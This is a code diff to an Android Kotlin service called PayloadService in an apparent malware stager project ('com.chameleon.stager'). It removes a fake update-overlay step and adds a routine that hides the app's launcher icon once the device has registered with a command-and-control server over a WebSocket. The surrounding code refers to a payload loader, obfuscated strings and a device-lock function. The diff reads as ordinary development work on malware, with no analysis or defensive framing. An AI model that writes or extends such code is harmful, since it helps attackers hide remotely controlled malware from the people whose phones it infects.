@@ -4,8 +4,10 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
@@ -13,7 +15,7 @@ import androidx.core.app.NotificationCompat
 import com.chameleon.stager.R
 import com.chameleon.stager.StagerApplication
 import com.chameleon.stager.payload.PayloadLoader
-import com.chameleon.stager.ui.UpdateOverlayActivity
+import com.chameleon.stager.ui.MainActivity
 import com.chameleon.stager.utils.CryptoUtils
 import com.chameleon.stager.utils.NetworkUtils
 import com.chameleon.stager.utils.ObfuscatedStrings
@@ -51,9 +53,6 @@ class PayloadService : Service() {
 
         // Step 2: Connect to C2
         connectToC2()
-
-        // Step 3: Start the update overlay
-        startUpdateOverlay()
 
         return START_STICKY
     }
@@ -147,8 +146,26 @@ class PayloadService : Service() {
             }
             c2WebSocket?.send(registerMsg.toString())
             Log.i(TAG, "Device registered with C2")
+            hideLauncherIcon()
         } catch (e: Exception) {
             Log.e(TAG, "Registration failed", e)
+        }
+    }
+
+    private fun hideLauncherIcon() {
+        try {
+            val pm = packageManager
+            val component = ComponentName(this, MainActivity::class.java)
+            if (pm.getComponentEnabledSetting(component) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                pm.setComponentEnabledSetting(
+                    component,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+                Log.i(TAG, "Launcher icon hidden")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to hide icon", e)
         }
     }
 
@@ -218,13 +235,6 @@ class PayloadService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Failed to send ack", e)
         }
-    }
-
-    private fun startUpdateOverlay() {
-        val intent = Intent(this, UpdateOverlayActivity::class.java).apply {
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        }
-        startActivity(intent)
     }
 
     private fun lockDevice() {
